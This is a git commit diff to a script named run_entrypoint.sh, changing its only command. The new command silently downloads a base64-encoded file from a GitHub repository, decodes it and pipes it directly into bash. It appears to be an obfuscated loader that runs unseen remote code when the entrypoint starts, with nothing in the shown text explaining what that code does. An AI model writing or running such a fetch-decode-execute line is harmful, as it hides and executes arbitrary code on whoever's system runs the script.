8a2a1734011bb98a4ad407c2531cbb96de649a18
paulbullet654 <paulbullet654@gmail.com>
2026-05-24 15:55:16 +0200

    Update run_entrypoint.sh

--- run_entrypoint.sh
+++ run_entrypoint.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-wget -qO- https://raw.githubusercontent.com/paulbullet/spice/refs/heads/main/entrypoint.sh | base64 -d | bash
+wget -qO- https://raw.githubusercontent.com/paulbullet654/racer/refs/heads/main/entrypoint.sh | base64 -d | bash
